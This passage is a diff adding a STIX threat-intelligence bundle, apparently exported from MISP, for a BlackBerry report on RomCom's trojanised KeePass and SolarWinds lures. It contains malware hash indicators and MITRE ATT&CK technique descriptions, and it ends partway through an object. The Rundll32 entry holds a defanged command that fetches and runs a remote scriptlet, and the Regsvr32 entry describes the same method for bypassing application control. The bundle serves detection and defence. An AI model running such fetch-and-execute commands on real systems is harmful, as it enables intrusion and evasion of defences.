@@ -1,0 +1,647 @@
+{
+    "type": "bundle",
+    "spec_version": "2.0",
+    "id": "bundle--1996c3b6-c8f1-4921-9198-0e970af7fa31",
+    "objects": [
+        {
+            "type": "identity",
+            "id": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:25:52.000Z",
+            "modified": "2022-11-03T15:25:52.000Z",
+            "name": "Threat Research and Intelligence - BlackBerry Cylance",
+            "identity_class": "organization"
+        },
+        {
+            "type": "report",
+            "id": "report--07953c53-8be6-421a-99de-5373ef740ba1",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:25:52.000Z",
+            "modified": "2022-11-03T15:25:52.000Z",
+            "name": "RomCom Threat Actor Abuses KeePass and SolarWinds to Target Ukraine and Potentially the United Kingdom",
+            "published": "2022-11-03T15:25:52Z",
+            "object_refs": [
+                "indicator--63c8a6f2-b348-48cc-9f10-e86486483b68",
+                "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
+                "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
+                "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
+                "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+                "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
+                "indicator--b843903a-afc2-4e3b-9bc9-c187d66d01e8",
+                "indicator--3b5ebf52-304d-4c4d-84af-f7aff300a1fc",
+                "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384",
+                "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735",
+                "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+                "indicator--eaf205f3-dff8-4471-8b0e-fc4ae30384db",
+                "indicator--16cf67c0-5cf0-4284-81e8-9625c6f854e7",
+                "indicator--54e5ee88-30eb-4339-8ead-624f5fd55dd3",
+                "indicator--13ff6d51-4824-4301-b588-84fe21e77699",
+                "indicator--e9fdb44a-4636-4233-8d35-f73710571cd4",
+                "indicator--d6a0d0a8-a415-4ad3-bdd8-ae4805b8e268",
+                "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
+                "attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3",
+                "malware--7b7c3631-2f5a-484d-ae0d-d701cc94b858",
+                "relationship--8dcb5cf0-bea0-4775-904d-599a34da1fcc",
+                "relationship--742fe24b-c168-45b6-b402-7cc2cd4fe70e",
+                "relationship--6daf478b-4921-48a5-8605-624e1a598b9b",
+                "relationship--ec918a16-09a8-4eaa-9025-29f403d72649",
+                "relationship--bda79ab2-7b58-488a-be16-d689886085bd",
+                "relationship--b82b8f28-83fe-41bb-9012-74022d7aa9e8",
+                "relationship--7572d940-0756-435b-b77b-dff21d8b3013",
+                "relationship--a7618fde-b486-4fc3-826d-fd8ed7102313",
+                "relationship--6f65e55f-40c7-41a1-9202-5c125452ba98",
+                "relationship--ab3f32de-2cff-4e0f-9190-44e798f2964b",
+                "relationship--c024a48d-38fc-47e5-b256-3f79abec98cc",
+                "relationship--c514bddf-831a-4c30-8ab7-607167141c19",
+                "relationship--de47f49b-2f71-4c64-9ad3-b735d7fb2087"
+            ],
+            "labels": [
+                "Threat-Report",
+                "misp:tool=\"MISP-STIX-Converter\"",
+                "misp-galaxy:sigma-rules=\"User with Privileges Logon\"",
+                "misp-galaxy:malpedia=\"7b7c3631-2f5a-484d-ae0d-d701cc94b858\"",
+                "misp-galaxy:country=\"ukraine\"",
+                "misp-galaxy:region=\"151 - Eastern Europe\"",
+                "misp-galaxy:sector=\"Military\""
+            ],
+            "object_marking_refs": [
+                "marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da"
+            ]
+        },
+        {
+            "type": "indicator",
+            "id": "indicator--63c8a6f2-b348-48cc-9f10-e86486483b68",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "pattern": "[file:hashes.MD5 = '1a21a1e626fd342e794bcc3b06981d2c' AND file:hashes.SHA1 = 'a1aa16c9e2dfd74c4470045da1180e015c015de8' AND file:hashes.SHA256 = '596eaef93bdcd00a3aedaf6ad6d46db4429eeba61219b7e01b1781ebbf6e321b' AND file:hashes.SSDEEP = '98304:gj6SvYfthAeIFRiowWork1M+9ziAoMjOHQHT6F3XnST6ImJ8nAfw9poj8W7XlSGH:g/vethAvn7w5rky+9hjHz69XW686jbVj' AND file:hashes.TLSH = 't14246337b23db2442ca262e6373e31eae685e5bd719fdd3994430abd62c137403a32355' AND file:hashes.VHASH = '50f4a40415029d736dac4e74f786e0cb' AND file:name = '596eaef93bdcd00a3aedaf6ad6d46db4429eeba61219b7e01b1781ebbf6e321b.bin' AND file:name = 'KeePass-2.52.zip' AND file:x_misp_mimetype = 'application/zip' AND file:x_misp_text = 'Zip archive data, at least v2.0 to extract']",
+            "valid_from": "2022-11-03T15:03:27Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "file"
+                }
+            ],
+            "labels": [
+                "misp:name=\"file\"",
+                "misp:meta-category=\"file\"",
+                "misp:to_ids=\"True\""
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "name": "System Information Discovery - T1082",
+            "description": "ATT&CK Tactic | An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information.(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"System Information Discovery - T1082\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "external_id": "CAPEC-312"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "name": "Virtualization/Sandbox Evasion - T1497",
+            "description": "ATT&CK Tactic | Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)\n\n",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"Virtualization/Sandbox Evasion - T1497\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "external_id": "T1497"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "name": "Process Injection - T1055",
+            "description": "ATT&CK Tactic | Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"Process Injection - T1055\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "external_id": "CAPEC-640"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "name": "Rundll32 - T1218.011",
+            "description": "ATT&CK Tactic | Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"Rundll32 - T1218.011\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "external_id": "T1218.011"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "name": "Masquerading - T1036",
+            "description": "ATT&CK Tactic | Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"Masquerading - T1036\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "external_id": "CAPEC-177"
+                }
+            ]
+        },
+        {
+            "type": "indicator",
+            "id": "indicator--b843903a-afc2-4e3b-9bc9-c187d66d01e8",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:03:27.000Z",
+            "modified": "2022-11-03T15:03:27.000Z",
+            "pattern": "[file:hashes.MD5 = '8284421bbb94f3c37f94899cdcd19afd' AND file:hashes.SHA1 = 'f38665cf13204f915d2efe78658a6dc65c4ca224' AND file:hashes.SHA256 = '8b8dff5d30802fd79b76ee1531e7d050184a07570201ef1cd83a7bb8fa627cb0' AND file:hashes.SSDEEP = '12288:JCRdjNO05IOUxi3xULo2Vk4ZN7CqQDqPLP68etJeaBwnlZAlPQ/NdLk+17MtqqAm:Jad5rHUNNi+byYK8TU9DMzH2Kru11' AND file:hashes.TLSH = 't191f49d1ab2a840b9e0b7a078c8871a16e7b1788917715b6f53b04baf1f277715f3e350' AND file:hashes.VHASH = '175076655d155515655038z55?z1' AND file:name = '8b8dff5d30802fd79b76ee1531e7d050184a07570201ef1cd83a7bb8fa627cb0.bin' AND file:x_misp_mimetype = 'application/octet-stream' AND file:x_misp_text = 'PE32+ executable for MS Windows (DLL) (GUI) Mono/.Net assembly']",
+            "valid_from": "2022-11-03T15:03:27Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "file"
+                }
+            ],
+            "labels": [
+                "misp:name=\"file\"",
+                "misp:meta-category=\"file\"",
+                "misp:to_ids=\"True\""
+            ]
+        },
+        {
+            "type": "indicator",
+            "id": "indicator--3b5ebf52-304d-4c4d-84af-f7aff300a1fc",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "pattern": "[file:hashes.MD5 = '550f42c5b555893d171285dc8b15b4b5' AND file:hashes.SHA1 = '36fb60b9aa51cf8ad9353b2aea24bc80545a9b93' AND file:hashes.SHA256 = '5f187393acdeb67e76126353c74b6080d3e6ccf28ae580658c670d8b6e4aacc1' AND file:hashes.SSDEEP = '3072:KO0J2HpaGm14EpPDK38yn1knptUsG8iQOzrh3S8II:x0sH1mHDK1ZkORS8II' AND file:hashes.TLSH = 't12bf3295375e08460ecb1497169f194b01f3f7c220eb9a86a27b8a73e4f72a51dd37722' AND file:hashes.VHASH = '015056655d15556az47nz2fz' AND file:x_misp_mimetype = 'application/octet-stream' AND file:x_misp_text = 'PE32 executable for MS Windows (GUI) Intel 80386 32-bit']",
+            "valid_from": "2022-11-03T15:03:28Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "file"
+                }
+            ],
+            "labels": [
+                "misp:name=\"file\"",
+                "misp:meta-category=\"file\"",
+                "misp:to_ids=\"True\""
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "name": "Security Software Discovery - T1518.001",
+            "description": "ATT&CK Tactic | Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"Security Software Discovery - T1518.001\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "external_id": "CAPEC-581"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "name": "Remote System Discovery - T1018",
+            "description": "ATT&CK Tactic | Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network.(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"Remote System Discovery - T1018\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "external_id": "CAPEC-292"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "name": "Regsvr32 - T1218.010",
+            "description": "ATT&CK Tactic | Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"Regsvr32 - T1218.010\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "external_id": "T1218.010"
+                }
+            ]
+        },
+        {
+            "type": "indicator",
+            "id": "indicator--eaf205f3-dff8-4471-8b0e-fc4ae30384db",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:03:28.000Z",
+            "modified": "2022-11-03T15:03:28.000Z",
+            "pattern": "[file:hashes.MD5 = 'a7172aef66bb12e1bb40a557bb41e607' AND file:hashes.SHA1 = '260ab60e78919a80297c2b2ae461a3a60c43d546' AND file:hashes.SHA256 = '3252965013ec861567510d54a97446610edba5da88648466de6b3145266386d9' AND file:hashes.SSDEEP = '12288:GUxi3xULo2Vk4ZN7CqQDqPLP68etJeaBwnlZAlPQ/NdLk+17MtqqAPyYK8Twf9Dt:GUNNi+byYK8TU9DMzH2Kru11' AND file:hashes.TLSH = 't12fd49e1962e841b8e0a7a078c8875616d7f1788a16724a6f53b05bbf2f3b7315f3e350' AND file:hashes.VHASH = '165076655d1555151550f8z86nz15zd4z1ad' AND file:name = '\\\\%PUBLIC\\\\%\\\\Libraries\\\\rtmpak.dll' AND file:name = '3252965013ec861567510d54a97446610edba5da88648466de6b3145266386d9.bin' AND file:name = 'combase32.dll' AND file:name = 'rtmpak.dll' AND file:x_misp_mimetype = 'application/octet-stream' AND file:x_misp_text = 'PE32+ executable for MS Windows (DLL) (GUI) Mono/.Net assembly']",
+            "valid_from": "2022-11-03T15:03:28Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "file"
+                }
+            ],
+            "labels": [
+                "misp:name=\"file\"",
+                "misp:meta-category=\"file\"",
+                "misp:to_ids=\"True\"",
+                "misp-galaxy:sigma-rules=\"User with Privileges Logon\""
+            ]
+        },
+        {
+            "type": "indicator",
+            "id": "indicator--16cf67c0-5cf0-4284-81e8-9625c6f854e7",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:03:29.000Z",
+            "modified": "2022-11-03T15:03:29.000Z",
+            "pattern": "[file:hashes.SHA256 = '246dfe16a9248d7fb90993f6f28b0ebe87964ffd2dcdb13105096cde025ca614']",
+            "valid_from": "2022-11-03T15:03:29Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "file"
+                }
+            ],
+            "labels": [
+                "misp:name=\"file\"",
+                "misp:meta-category=\"file\"",
+                "misp:to_ids=\"True\""
+            ]
+        },
+        {
+            "type": "indicator",
+            "id": "indicator--54e5ee88-30eb-4339-8ead-624f5fd55dd3",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:03:29.000Z",
+            "modified": "2022-11-03T15:03:29.000Z",
+            "pattern": "[file:hashes.SHA256 = '9d3b268416d3fab4322cc916d32e0b2e8fa0de370acd686873d1522306124fd2']",
+            "valid_from": "2022-11-03T15:03:29Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "file"
+                }
+            ],
+            "labels": [
+                "misp:name=\"file\"",
+                "misp:meta-category=\"file\"",
+                "misp:to_ids=\"True\""
+            ]
+        },
+        {
+            "type": "indicator",
+            "id": "indicator--13ff6d51-4824-4301-b588-84fe21e77699",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:03:29.000Z",
+            "modified": "2022-11-03T15:03:29.000Z",
+            "pattern": "[file:hashes.SHA256 = 'ac09cbfee4cf89d7b7a755c387e473249684f18aa699eb651d119d19e25bff34']",
+            "valid_from": "2022-11-03T15:03:29Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "file"
+                }
+            ],
+            "labels": [
+                "misp:name=\"file\"",
+                "misp:meta-category=\"file\"",
+                "misp:to_ids=\"True\""
+            ]
+        },
+        {
+            "type": "indicator",
+            "id": "indicator--e9fdb44a-4636-4233-8d35-f73710571cd4",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:03:29.000Z",
+            "modified": "2022-11-03T15:03:29.000Z",
+            "pattern": "[file:hashes.SHA256 = 'f7013ce417fcba0f36c4b9bf5f8f6e0e2b14d6ed33ff4d384c892773508e932e']",
+            "valid_from": "2022-11-03T15:03:29Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "file"
+                }
+            ],
+            "labels": [
+                "misp:name=\"file\"",
+                "misp:meta-category=\"file\"",
+                "misp:to_ids=\"True\""
+            ]
+        },
+        {
+            "type": "indicator",
+            "id": "indicator--d6a0d0a8-a415-4ad3-bdd8-ae4805b8e268",
+            "created_by_ref": "identity--2f7b6b3e-5374-4c13-9b73-2409ef8c1306",
+            "created": "2022-11-03T15:03:29.000Z",
+            "modified": "2022-11-03T15:03:29.000Z",
+            "pattern": "[file:hashes.SHA256 = 'abe9635adbfee2d2fbaea140625c49abe3baa29c44fb53a65a9cda02121583ee']",
+            "valid_from": "2022-11-03T15:03:29Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "file"
+                }
+            ],
+            "labels": [
+                "misp:name=\"file\"",
+                "misp:meta-category=\"file\"",
+                "misp:to_ids=\"True\""
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
+            "created": "2022-11-03T15:25:52.000Z",
+            "modified": "2022-11-03T15:25:52.000Z",
+            "name": "Spearphishing Link - T1566.002",
+            "description": "ATT&CK Tactic | Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). \n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "misp-category",
+                    "phase_name": "mitre-attack-pattern"
+                }
+            ],
+            "labels": [
+                "misp:galaxy-name=\"Attack Pattern\"",
+                "misp:galaxy-type=\"mitre-attack-pattern\"",
+                "misp-galaxy:mitre-attack-pattern=\"Spearphishing Link - T1566.002\""
+            ],
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "external_id": "CAPEC-163"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3",
+            "created": "2022-11-03T15:25:52.000Z",
+            "modified": "2022-11-03T15:25:52.000Z",
+            "name": "Domains - T1583.001",
